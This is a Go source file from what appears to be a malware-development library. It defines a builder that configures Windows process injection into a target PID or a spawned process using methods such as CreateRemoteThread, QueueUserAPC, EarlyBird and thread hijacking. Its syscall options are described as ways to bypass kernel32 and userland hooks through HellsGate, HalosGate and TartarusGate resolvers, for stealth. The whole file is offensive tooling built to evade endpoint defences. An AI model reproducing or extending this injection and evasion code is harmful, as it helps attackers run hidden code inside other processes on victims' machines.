//go:build windows

package inject

import (
	"fmt"

	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// InjectorBuilder provides a fluent API for constructing Windows injectors.
//
// The builder validates that all configuration options are compatible
// before creating the injector. For example, it rejects indirect syscalls
// combined with methods that have no NT equivalent (like CreateFiber).
//
// Example:
//
//	injector, err := inject.Build().
//	    Method(inject.MethodCreateRemoteThread).
//	    TargetPID(1234).
//	    IndirectSyscalls().
//	    WithFallback().
//	    Create()
type InjectorBuilder struct {
	method      Method
	pid         int
	processPath string
	fallback    bool

	syscallMethod   wsyscall.Method
	syscallResolver wsyscall.SSNResolver

	middlewares []MiddlewareFunc

	err error
}

// Build starts building a new Windows injector.
func Build() *InjectorBuilder {
	return &InjectorBuilder{
		syscallMethod: wsyscall.MethodWinAPI,
	}
}

// Method sets the injection technique.
func (b *InjectorBuilder) Method(m Method) *InjectorBuilder {
	b.method = m
	return b
}

// TargetPID sets the target process ID for remote injection.
func (b *InjectorBuilder) TargetPID(pid int) *InjectorBuilder {
	b.pid = pid
	return b
}

// ProcessPath sets the path to spawn for EarlyBird/ThreadHijack methods.
func (b *InjectorBuilder) ProcessPath(path string) *InjectorBuilder {
	b.processPath = path
	return b
}

// WithFallback enables automatic fallback to alternate methods on failure.
func (b *InjectorBuilder) WithFallback() *InjectorBuilder {
	b.fallback = true
	return b
}

// WinAPI uses standard WinAPI calls (default, most compatible).
func (b *InjectorBuilder) WinAPI() *InjectorBuilder {
	b.syscallMethod = wsyscall.MethodWinAPI
	b.syscallResolver = nil
	return b
}

// NativeAPI routes through ntdll NtXxx functions (bypass kernel32 hooks).
func (b *InjectorBuilder) NativeAPI() *InjectorBuilder {
	b.syscallMethod = wsyscall.MethodNativeAPI
	b.syscallResolver = nil
	return b
}

// DirectSyscalls uses in-process syscall stubs (bypass all userland hooks).
// Auto-configures Chain(HellsGate, HalosGate) resolver if none set.
func (b *InjectorBuilder) DirectSyscalls() *InjectorBuilder {
	b.syscallMethod = wsyscall.MethodDirect
	return b
}

// IndirectSyscalls uses syscall;ret gadgets in ntdll (most stealthy).
// Auto-configures Chain(HellsGate, HalosGate, TartarusGate) resolver if none set.
func (b *InjectorBuilder) IndirectSyscalls() *InjectorBuilder {
	b.syscallMethod = wsyscall.MethodIndirect
	return b
}

// Resolver sets a custom SSN resolver for Direct/Indirect methods.
func (b *InjectorBuilder) Resolver(r wsyscall.SSNResolver) *InjectorBuilder {
	b.syscallResolver = r
	return b
}

// Use adds a decorator middleware applied to the final injector.
// Middlewares are applied in order: first added is outermost.
func (b *InjectorBuilder) Use(mw MiddlewareFunc) *InjectorBuilder {
	b.middlewares = append(b.middlewares, mw)
	return b
}

// Create validates the configuration and returns the configured Injector.
func (b *InjectorBuilder) Create() (Injector, error) {
	if b.err != nil {
		return nil, b.err
	}
	if b.method == "" {
		return nil, fmt.Errorf("injection method is required")
	}

	// Validate method/PID combinations
	if needsRemotePID(b.method) && b.pid == 0 {
		return nil, fmt.Errorf("method %s requires a target PID", b.method)
	}

	cfg := &WindowsConfig{
		Config: Config{
			Method:      b.method,
			PID:         b.pid,
			ProcessPath: b.processPath,
			Fallback:    b.fallback,
		},
		SyscallMethod:   b.syscallMethod,
		SyscallResolver: b.syscallResolver,
	}

	injector, err := NewWindowsInjector(cfg)
	if err != nil {
		return nil, err
	}

	// Apply decorator middlewares
	if len(b.middlewares) > 0 {
		injector = Chain(injector, b.middlewares...)
	}

	return injector, nil
}

// needsRemotePID returns true for methods that inject into another process.
func needsRemotePID(m Method) bool {
	switch m {
	case MethodCreateRemoteThread, MethodQueueUserAPC,
		MethodRtlCreateUserThread, MethodNtQueueApcThreadEx:
		return true
	}
	return false
}
